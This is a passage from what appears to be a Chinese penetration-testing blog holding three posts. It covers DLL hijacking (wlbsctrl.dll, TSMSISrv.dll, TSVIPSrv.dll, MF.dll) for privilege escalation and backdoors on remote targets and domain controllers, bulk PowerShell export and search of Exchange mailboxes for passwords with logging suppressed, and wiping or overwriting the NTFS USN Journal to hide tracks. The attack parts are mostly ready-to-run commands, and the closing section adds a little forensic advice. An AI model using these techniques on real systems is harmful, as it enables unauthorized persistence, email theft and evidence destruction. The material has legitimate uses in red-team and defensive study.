<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy calc_x64.dll \\TARGET\C$\Windows\System32\wlbsctrl.dll
sc \\TARGET query IKEEXT
sc \\TARGET stop IKEEXT
sc \\TARGET start IKEEXT
</code></pre></div></div>

<h3 id="2利用wlbsctrldll实现的提权">2、利用wlbsctrl.dll实现的提权</h3>

<p>POC：</p>

<p>https://github.com/itm4n/Ikeext-Privesc</p>

<p>实现原理：</p>

<h4 id="1-ikeextike-and-authip-ipsec-keying-modules服务在启动时会加载wlbsctrldll但并未指定绝对路径">1. IKEEXT(IKE and AuthIP IPsec Keying Modules)服务在启动时会加载wlbsctrl.dll，但并未指定绝对路径</h4>

<p><strong>注：</strong></p>

<p>程序在调用DLL时，如果未指明DLL的完整路径，那么系统会按照一套固定的搜索顺序寻找DLL</p>

<p>如果SafeDllSearchMode开启，程序会依次从以下位置查找DLL文件：</p>

<ul>
  <li>The directory from which the application loaded</li>
  <li>The system directory</li>
  <li>The 16-bit system directory</li>
  <li>The Windows directory</li>
  <li>The current directory</li>
  <li>The directories that are listed in the PATH environment variable</li>
</ul>

<p>如果关闭，则从以下位置查找DLL文件：</p>

<ul>
  <li>The directory from which the application loaded</li>
  <li>The current directory</li>
  <li>The system directory</li>
  <li>The 16-bit system directory</li>
  <li>The Windows directory</li>
  <li>The directories that are listed in the PATH environment variable</li>
</ul>

<p>详细内容见：</p>

<p>https://msdn.microsoft.com/en-us/library/ms682586(VS.85).aspx</p>

<h4 id="2-windows系统默认配置下不存在wlbsctrldll如果我们能够找到满足条件的path环境变量普通用户权限可写就能实现dll劫持加载我们自己的dll">2. Windows系统默认配置下不存在wlbsctrl.dll，如果我们能够找到满足条件的PATH环境变量(普通用户权限可写)，就能实现dll劫持，加载我们自己的dll</h4>

<h4 id="3-普通用户权限能够启动ikeext服务方法如下">3. 普通用户权限能够启动IKEEXT服务，方法如下：</h4>

<p>生成文件rasphone.pbk:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[IKEEXT]
MEDIA=rastapi
Port=VPN2-0
Device=Wan Miniport (IKEv2)
DEVICE=vpn
PhoneNumber=127.0.0.1
</code></pre></div></div>

<p>命令行执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rasdial IKEEXT test test /PHONEBOOK:rasphone.pbk
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>这个漏洞很古老，早在2012年10月9日被公开</p>

<p>https://www.immuniweb.com/advisory/HTB23108</p>

<h2 id="0x04-tsmsisrvdll和tsvipsrvdll的利用">0x04 TSMSISrv.dll和TSVIPSrv.dll的利用</h2>
<hr>

<h3 id="1原文中的用法-1">1、原文中的用法</h3>

<p>SessionEnv(Remote Desktop Configuration)服务在启动时会加载<code class="language-plaintext highlighter-rouge">C:\Windows\System32\TSMSISrv.dll</code>和<code class="language-plaintext highlighter-rouge">C:\Windows\System32\TSVIPSrv.dll</code>，但Windows系统默认配置下这两个dll不存在，如果我们将自己的dll放在这个位置，在服务启动时就能加载该dll</p>

<p>POC：</p>

<p>https://github.com/djhohnstein/TSMSISrv_poc</p>

<p>测试系统： Win7 x64</p>

<p>POC添加了导出函数<code class="language-plaintext highlighter-rouge">StartComponent</code>、<code class="language-plaintext highlighter-rouge">StopComponent</code>、<code class="language-plaintext highlighter-rouge">OnSessionChange</code>和<code class="language-plaintext highlighter-rouge">Refresh</code></p>

<p>我的测试环境下dll不需要指定导出函数，所以可以直接使用之前我的测试dll：</p>

<p>https://github.com/3gstudent/test/raw/master/calc_x64.dll</p>

<p>本地执行的用法：
(需要管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy calc_x64.dll C:\Windows\System32\TSMSISrv.dll
sc query IKEEXT
sc stop IKEEXT
sc start IKEEXT
</code></pre></div></div>

<p>或者</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy calc_x64.dll C:\Windows\System32\TSVIPSrv.dll
sc query IKEEXT
sc stop IKEEXT
sc start IKEEXT
</code></pre></div></div>

<p>远程执行的用法：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy calc_x64.dll \\TARGET\C$\Windows\System32\TSMSISrv.dll
sc \\TARGET query IKEEXT
sc \\TARGET stop IKEEXT
sc \\TARGET start IKEEXT
</code></pre></div></div>

<p>或者</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy calc_x64.dll \\TARGET\C$\Windows\System32\TSVIPSrv.dll
sc \\TARGET query IKEEXT
sc \\TARGET stop IKEEXT
sc \\TARGET start IKEEXT
</code></pre></div></div>

<h3 id="2利用tsmsisrvdll和tsvipsrvdll实现的后门">2、利用TSMSISrv.dll和TSVIPSrv.dll实现的后门</h3>

<p>如果系统开启了远程桌面的功能(支持远程连接到此计算机)，就会开启SessionEnv(Remote Desktop Configuration)服务</p>

<p>如果我们在<code class="language-plaintext highlighter-rouge">C:\Windows\System32\</code>下写入TSMSISrv.dll或TSVIPSrv.dll，就能在服务启动时加载该dll，实现代码执行</p>

<p><strong>应用场景：</strong></p>

<p>获得域控制器文件的远程访问权限，但无法远程执行命令</p>

<p><strong>解决方法：</strong></p>

<p>1.如果域控制器未开启远程桌面的功能，在系统启动时劫持Explorer.exe对fxsst.dll的加载</p>

<p>写入文件<code class="language-plaintext highlighter-rouge">C:\Windows\fxsst.dll</code></p>

<p>2.如果域控制器开启了远程桌面的功能，在系统启动时将开启SessionEnv服务，加载TSMSISrv.dll或TSVIPSrv.dll</p>

<p>写入文件<code class="language-plaintext highlighter-rouge">C:\Windows\System32\TSMSISrv.dll</code>或<code class="language-plaintext highlighter-rouge">C:\Windows\System32\TSMSISrv.dll</code></p>

<p>3.如果域控制器开启了远程桌面的功能，在用户进行远程桌面连接时将会加载MF.dll</p>

<p><strong>实际测试：</strong></p>

<p>测试环境： Server2012R2 x64</p>

<p>写入文件<code class="language-plaintext highlighter-rouge">C:\Windows\System32\MF.dll</code>，命令如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy calc_x64.dll C:\Windows\System32\MF.dll
</code></pre></div></div>

<p>等待用户连接远程桌面，连接成功后加载MF.dll，弹出计算器，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-24/2-1.png" alt="Alt text"></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了三个利用方法：利用wlbsctrl.dll实现的提权、利用TSMSISrv.dll/TSVIPSrv.dll实现的后门和利用MF.dll实现的后门，其中MF.dll可以用来解决获得域控制器文件的远程访问权限，但无法远程执行命令的问题。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 24, 2019
  </div>

  
</article><article class="post">
  <h1>渗透基础——从Exchange服务器上搜索和导出邮件</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，如果我们获得了Exchange服务器的管理权限，下一步就需要对Exchange服务器的邮件进行搜索和导出，本文将要介绍常用的两种方法，开源4个powershell脚本，分享脚本编写细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>管理Exchange服务器上邮件的两种方法</li>
  <li>导出邮件的两种方法</li>
  <li>搜索邮件的两种方法</li>
</ul>

<p><strong>注：</strong></p>

<p>本文介绍的方法均为powershell命令</p>

<h2 id="0x02-管理exchange服务器上邮件的两种方法">0x02 管理Exchange服务器上邮件的两种方法</h2>
<hr>

<h3 id="1先使用pssession连接exchange服务器进而远程管理邮件">1.先使用PSSession连接Exchange服务器，进而远程管理邮件</h3>

<p>使用PSSession连接Exchange服务器的命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$User = "test\administrator"
$Pass = ConvertTo-SecureString -AsPlainText DomainAdmin123! -Force
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://Exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential $Credential
Import-PSSession $Session -AllowClobber
</code></pre></div></div>

<p>补充：</p>

<p>查看PSSession：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-PSSession
</code></pre></div></div>

<p>断开PSSession：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-PSSession $Session
</code></pre></div></div>

<p>测试命令(获得所有邮箱用户):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Mailbox
</code></pre></div></div>

<h3 id="2直接在exchange服务器上执行管理邮件的命令">2.直接在Exchange服务器上执行管理邮件的命令</h3>

<p>测试命令(获得所有邮箱用户的名称):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
Get-Mailbox
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>不同Exchange版本对应的管理单元名称不同：</p>

<ul>
  <li>Exchange 2007:
  Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin;</li>
  <li>Exchange 2010:
  Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010;</li>
  <li>Exchange 2013 &amp; 2016:
  Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;</li>
</ul>

<h3 id="补充管理exchange邮件的常用命令">补充：管理Exchange邮件的常用命令</h3>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/powershell/module/exchange/?view=exchange-ps</p>

<h4 id="1获得所有邮箱用户名称">(1)获得所有邮箱用户名称：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Mailbox -ResultSize unlimited
</code></pre></div></div>

<p>默认显示1000个用户，加上<code class="language-plaintext highlighter-rouge">-ResultSize unlimited</code>可以获得所有用户</p>

<h4 id="2获得所有邮箱的信息包括邮件数和上次访问邮箱的时间">(2)获得所有邮箱的信息，包括邮件数和上次访问邮箱的时间</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Mailbox | Get-MailboxStatistics
</code></pre></div></div>

<h4 id="3获得所有ou">(3)获得所有OU</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-OrganizationalUnit
</code></pre></div></div>

<h4 id="4通过邮件跟踪日志获得收发邮件的相关信息">(4)通过邮件跟踪日志获得收发邮件的相关信息</h4>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/powershell/module/exchange/mail-flow/get-messagetrackinglog?view=exchange-ps</p>

<p>邮件跟踪日志默认保存位置：<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%TransportRoles\Logs\MessageTracking</code></p>

<p>查看发件人<code class="language-plaintext highlighter-rouge">test1@test.com</code>从2019年1月1日9:00至今发送的所有邮件的相关信息(包括发件人，收件人和邮件主题)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-MessageTrackingLog -Start "01/11/2019 09:00:00" -Sender "test1@test.com"
</code></pre></div></div>

<p>返回的结果很杂乱，其中包括多个事件：</p>

<ul>
  <li>DSN</li>
  <li>Defer</li>
  <li>Deliver</li>
  <li>Send</li>
  <li>Receive</li>
</ul>

<p>只筛选出发送事件，使返回结果更简洁:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-MessageTrackingLog -EventID send -Start "01/11/2019 09:00:00" -Sender "test1@test.com"
</code></pre></div></div>

<p>统计每天收发邮件数目的脚本：</p>

<p>https://gallery.technet.microsoft.com/office/f2af711e-defd-476d-896e-8053aa964bc5/view/Discussions</p>

<p>需要修改起始时间和添加加载Exchange powershell管理单元的命令</p>

<h2 id="0x03-导出邮件的两种方法">0x03 导出邮件的两种方法</h2>
<hr>

<h3 id="1使用pssession建立连接并导出邮件">1.使用PSSession建立连接并导出邮件</h3>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/powershell/module/exchange/mailboxes/new-mailboxexportrequest?view=exchange-ps</p>

<h4 id="1将用户添加到角色组mailbox-import-export">(1)将用户添加到角色组”Mailbox Import Export”</h4>

<p>这里以用户administrator为例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-ManagementRoleAssignment –Role "Mailbox Import Export" –User Administrator
</code></pre></div></div>

<p>补充：移除的命令</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-ManagementRoleAssignment -Identity "Mailbox Import Export-Administrator" -Confirm:$false
</code></pre></div></div>

<p>添加后再次查看进行确认：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ManagementRoleAssignment –Role "Mailbox Import Export"|fl user
</code></pre></div></div>

<h4 id="2重新启动powershell">(2)重新启动Powershell</h4>

<p>否则，无法使用命令<code class="language-plaintext highlighter-rouge">New-MailboxexportRequest</code></p>

<h4 id="3导出邮件并保存">(3)导出邮件并保存</h4>

<p>这里给出三个实例</p>

<p>1.导出指定用户的所有邮件，保存到Exchange服务器的c:\test</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$User = "test1"
New-MailboxexportRequest -mailbox $User -FilePath ("\\localhost\c$\test\"+$User+".pst")
</code></pre></div></div>

<p>2.筛选出指定用户的body中包含单词pass的邮件，保存到Exchange服务器的c:\test</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$User = "test1"
New-MailboxexportRequest -mailbox $User -ContentFilter {(body -like "*pass*")} -FilePath ("\\localhost\c$\test\"+$User+".pst")
</code></pre></div></div>

<p>3.导出所有邮件，保存到Exchange服务器的c:\test</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{New-MailboxexportRequest -mailbox $_.name -FilePath ("\\localhost\c$\test\"+($_.name)+".pst")}
</code></pre></div></div>

<p>导出后会自动保存导出请求的记录，默认为30天</p>

<p>如果不想保存导出请求，可以加上参数<code class="language-plaintext highlighter-rouge">-CompletedRequestAgeLimit 0</code></p>

<p>补充：关于导出请求的相关操作</p>

<p>查看邮件导出请求：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-MailboxExportRequest
</code></pre></div></div>

<p>删除具体的某个导出请求：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-MailboxExportRequest -RequestQueue "Mailbox Database 2057988509" -RequestGuid 650f52ec-722b-47bb-8e73-d16a17c32129 -Confirm:$false
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-MailboxExportRequest -Identity 'test.com/Users/test1\MailboxExport' -Confirm:$false
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>匹配的参数从<code class="language-plaintext highlighter-rouge">Get-MailboxExportRequest|fl</code>的结果中获得</p>

<p>删除所有导出请求：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false
</code></pre></div></div>

<p>综上，导出用户test1的特定邮件(body中包含单词pass)到Exchange服务器的c:\test的实现代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToExportMailfromExchange.ps1</p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UsePSSessionToExportMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ExportPath "\\Exchange01.test.com\c$\test\" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "{`"(body -like `"*pass*`")`"}"
</code></pre></div></div>

<p>流程如下：</p>

<p>1.使用PSSession连接到Exchange服务器
2.判断使用的用户是否被加入到角色组”Mailbox Import Export”
	如果未被添加，需要添加用户
3.导出邮件并保存至Exchange服务器的c:\test，格式为pst文件
4.如果新添加了用户，那么会将用户移除角色组”Mailbox Import Export”
5.清除PSSession</p>

<p>导出的pst文件使用Outlook打开即可</p>

<h3 id="2在exchange服务器上直接导出邮件">2.在Exchange服务器上直接导出邮件</h3>

<h4 id="1添加管理单元">(1)添加管理单元</h4>

<p>不同Exchange版本对应的管理单元名称不同：</p>

<ul>
  <li>Exchange 2007:
  Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin;</li>
  <li>Exchange 2010:
  Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010;</li>
  <li>Exchange 2013 &amp; 2016:
  Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;</li>
</ul>

<p>不需要考虑角色组，可以直接导出邮件</p>

<h4 id="2导出邮件">(2)导出邮件</h4>
<p>导出用户test1的邮件，保存到Exchange服务器的c:\test：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
$User = "test1"
New-MailboxexportRequest -mailbox $User -FilePath ("\\localhost\c$\test\"+$User+".pst")
</code></pre></div></div>

<p>参照1中的功能，导出用户test1的特定邮件(body中包含单词pass)到Exchange服务器的c:\test的实现代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectExportMailfromExchange.ps1</p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DirectExportMailfromExchange -MailBox "test1" -ExportPath "\\localhost\c$\test\" -Filter "{`"(body -like `"*pass*`")`"}" -Version 2013
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>需要指定Exchange版本</p>

<p>流程如下：</p>

<p>1.添加管理单元
2.导出邮件并保存至Exchange服务器的c:\test，格式为pst文件</p>

<p>导出的pst文件使用Outlook打开即可</p>

<h2 id="0x04-搜索邮件的两种方法">0x04 搜索邮件的两种方法</h2>
<hr>

<h3 id="1使用pssession建立连接并搜索邮件">1.使用PSSession建立连接并搜索邮件</h3>

<p>基本流程同导出邮件相似，区别在于角色组<code class="language-plaintext highlighter-rouge">"Mailbox Import Export"</code>需要更换成<code class="language-plaintext highlighter-rouge">"Mailbox Search"</code></p>

<p>实现代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToSearchMailfromExchange.ps1</p>

<p>从用户test1中搜索包含单词pass的邮件并保存到用户test2的out2文件夹，参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UsePSSessionToSearchMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "*pass*" -TargetMailbox "test2" -TargetFolder "out2"
</code></pre></div></div>

<p>导出的结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-2/2-1.png" alt="Alt text"></p>

<p>搜索所有包含单词pass的邮件并保存到用户test2的outAll文件夹，参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UsePSSessionToSearchMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "All" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "*pass*" -TargetMailbox "test2" -TargetFolder "outAll"
</code></pre></div></div>

<p>导出的结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-2/2-2.png" alt="Alt text"></p>

<h3 id="2在exchange服务器上直接搜索邮件">2.在Exchange服务器上直接搜索邮件</h3>

<p>基本流程同导出邮件相似，在具体命令上存在一些区别</p>

<p>实现代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectSearchMailfromExchange.ps1</p>

<p>从用户test1中搜索包含单词pass的邮件并保存到用户test2的out2文件夹，参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DirectSearchMailfromExchange -MailBox "test1" -Filter "*pass*" -TargetMailbox "test2" -TargetFolder "out2" -Version 2013
</code></pre></div></div>

<p>搜索所有包含单词pass的邮件并保存到用户test2的outAll文件夹，参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DirectSearchMailfromExchange -MailBox "All" -Filter "*pass*" -TargetMailbox "test2" -TargetFolder "outAll" -Version 2013
</code></pre></div></div>

<h3 id="补充搜索邮件的常用命令">补充：搜索邮件的常用命令</h3>

<p>(1)枚举所有邮箱用户，显示包含关键词pass的邮件的数量</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Mailbox|Search-Mailbox -SearchQuery "*pass*" -EstimateResultOnly
</code></pre></div></div>

<p>(2)搜索邮箱用户test1，显示包含关键词pass的邮件的数量</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Search-Mailbox -Identity test1 -SearchQuery "*pass*" -EstimateResultOnly
</code></pre></div></div>

<p>示例如下图，数量为4个</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-2/2-3.png" alt="Alt text"></p>

<p>(3)枚举所有邮箱用户，导出包含关键词pass的邮件至用户test2的文件夹out中(不保存日志)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Mailbox|Search-Mailbox -SearchQuery "*pass*" -TargetMailbox "test2" -TargetFolder "out" -LogLevel Suppress
</code></pre></div></div>

<p>(4)搜索邮箱用户test1，导出包含关键词pass的邮件至用户test2的文件夹out中(不保存日志)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Search-Mailbox -Identity test1 -SearchQuery "*pass*" -TargetMailbox "test2" -TargetFolder "out" -LogLevel Suppress
</code></pre></div></div>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了管理Exchange邮件的两种方式：在Exchange服务器上直接调用管理单元和使用PSSession建立连接并远程管理邮件，分别介绍了对应的导出和搜索邮件的方法，开源4个powershell脚本，分享脚本编写细节。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October  2, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows下NTFS文件的USN Journal</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8BNTFS%E6%96%87%E4%BB%B6%E7%9A%84%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/">《渗透技巧——Windows下NTFS文件的时间属性》</a>介绍了修改NTFS文件时间属性的方法和细节，以及取证上的建议。
本文将要继续研究NTFS文件另一处记录文件修改时间的位置——USN Journal，同样是分析利用思路，给出取证上的建议。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>基本概念</li>
  <li>读取USN Journal的方法</li>
  <li>利用思路</li>
  <li>取证建议</li>
</ul>

<h2 id="0x02-usn-journal的基本概念">0x02 USN Journal的基本概念</h2>
<hr>

<p>官方文档：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb742450(v=technet.10)</p>

<p>USN Journal (Update Sequence Number Journal)，也称作Change Journal，用来记录NTFS volume中文件修改的信息，能够提高搜索文件的效率</p>

<p>每个NTFS volume对应一个USN Journal，存储在<code class="language-plaintext highlighter-rouge">NTFS metafile</code>的<code class="language-plaintext highlighter-rouge">$Extend\$UsnJrnl</code>中，也就是说，不同的NTFS volume对应的USN Journal不同</p>

<p>USN Journal会记录文件和目录的创建、删除、修改、重命名和加解密操作，每条记录的格式如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct {
  DWORD         RecordLength;
  WORD          MajorVersion;
  WORD          MinorVersion;
  DWORDLONG     FileReferenceNumber;
  DWORDLONG     ParentFileReferenceNumber;
  USN           Usn;
  LARGE_INTEGER TimeStamp;
  DWORD         Reason;
  DWORD         SourceInfo;
  DWORD         SecurityId;
  DWORD         FileAttributes;
  WORD          FileNameLength;
  WORD          FileNameOffset;
  WCHAR         FileName[1];
} USN_RECORD_V2, *PUSN_RECORD_V2;
</code></pre></div></div>

<p>官方资料：</p>

<p>https://docs.microsoft.com/en-us/windows/desktop/api/winioctl/ns-winioctl-usn_record_v2</p>

<p>在<code class="language-plaintext highlighter-rouge">NTFS metafile</code>的<code class="language-plaintext highlighter-rouge">$Extend\$UsnJrnl\$Max</code>保存USN Journal文件的总大小，如果USN Journal的记录长度超出总大小，会从最初始的记录开始覆盖</p>

<h2 id="0x03-读取usn-journal的方法">0x03 读取USN Journal的方法</h2>
<hr>

<h3 id="1使用命令fsutil-usn">1、使用命令fsutil usn</h3>

<p>官方文档：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc788042(v%3dws.10)</p>

<h4 id="1查看c盘的usn-journal信息">(1)查看C盘的USN Journal信息</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fsutil usn queryjournal c:
</code></pre></div></div>

<p>包括以下信息：</p>

<ul>
  <li>Usn Journal ID</li>
  <li>First Usn</li>
  <li>Next Usn</li>
  <li>Lowest Valid Usn</li>
  <li>Max Usn</li>
  <li>Maximum Size</li>
  <li>Allocation Delta</li>
</ul>

<h4 id="2查看c盘所有的usn-journal">(2)查看C盘所有的USN Journal</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fsutil usn enumdata 1 0 1 c:
</code></pre></div></div>

<p>包括以下信息：</p>

<ul>
  <li>File Ref#</li>
  <li>ParentFile Ref#</li>
  <li>Usn</li>
  <li>SecurityId</li>
  <li>Reason</li>
  <li>Name</li>
</ul>

<p>输出结果不够详细</p>

<h3 id="2使用开源工具">2、使用开源工具</h3>

<h4 id="1导出usn-journal">(1)导出USN Journal</h4>

<p>下载地址：</p>

<p>https://github.com/jschicht/ExtractUsnJrnl</p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ExtractUsnJrnl /DevicePath:c: /OutputPath:c:\test /OutputName:UsnJrnl_vol1.bin
</code></pre></div></div>

<h4 id="2将usn-journal转为csv格式输出">(2)将USN Journal转为CSV格式输出</h4>

<p>下载地址：</p>

<p>https://github.com/jschicht/UsnJrnl2Csv</p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UsnJrnl2Csv /UsnJrnlFile:c:\test\UsnJrnl_vol1.bin /OutputPath:c:\test
</code></pre></div></div>

<p>包括以下信息：</p>

<ul>
  <li>Offset</li>
  <li>FileName</li>
  <li>USN</li>
  <li>Timestamp</li>
  <li>Reason</li>
  <li>MFTReference</li>
  <li>MFTReferenceSeqNo</li>
  <li>MFTParentReference</li>
  <li>MFTParentReferenceSeqNo</li>
  <li>FileAttributes</li>
  <li>MajorVersion</li>
  <li>MinorVersion</li>
  <li>SourceInfo</li>
  <li>SecurityId</li>
</ul>

<p>输出结果很完整</p>

<h3 id="3c实现">3、c++实现</h3>

<p>我这里写了一个简单的示例代码，下载地址：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnumUsnJournal.cpp</p>

<p>代码实现了枚举C盘的USN Journal，仅输出文件名</p>

<h2 id="0x04-利用思路">0x04 利用思路</h2>
<hr>

<h3 id="1清除所有usn-journal">1、清除所有USN Journal</h3>

<h4 id="1使用fsutil">(1)使用fsutil</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fsutil usn deletejournal /d c:
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>我在测试环境下没有删除成功</p>

<h4 id="2api">(2)API</h4>

<p>https://docs.microsoft.com/en-us/windows/desktop/api/winioctl/ns-winioctl-delete_usn_journal_data</p>

<p><strong>注：</strong></p>

<p>我在测试环境下没有删除成功</p>

<h3 id="2清除单条usn-journal">2、清除单条USN Journal</h3>

<p>我还没有找到可用的API接口</p>

<p>唯一的方法是直接修改NTFS文件，但是自nt6.x开始，Windows禁止加载未经签名的驱动文件</p>

<p>这里可以尝试使用付费版的WinHex对NTFS文件进行操作，修改<code class="language-plaintext highlighter-rouge">$Extend\$UsnJrnl</code>中的内容</p>

<p>也可以尝试绕过驱动保护</p>

<p>$UsnJrnl的内容可参考：</p>

<p>http://forensicinsight.org/wp-content/uploads/2013/07/F-INSIGHT-Advanced-UsnJrnl-Forensics-English.pdf</p>

<p>按照格式读取USN Journal，删除指定USN Journal，再写入磁盘</p>

<h3 id="3暴力覆盖">3、暴力覆盖</h3>

<p>首先查看磁盘USN Journal文件的总长度</p>

<p>然后通过创建、删除、修改、重命名等操作生成USN Journal的记录，当超过总长度后会覆盖最初始的记录，直至覆盖所有的USN Journal</p>

<h2 id="0x05-取证建议">0x05 取证建议</h2>
<hr>

<h4 id="1读取usn-journal列出所有记录查找是否存在可疑记录">1、读取USN Journal，列出所有记录，查找是否存在可疑记录</h4>

<p>该方法并非完全可信，攻击者只要能够绕过驱动保护，就能修改USN Journal</p>

<h4 id="2尝试其他方法">2、尝试其他方法</h4>

<p>比如从内存中读取$MFT records</p>

<p>https://github.com/jschicht/HexDump</p>

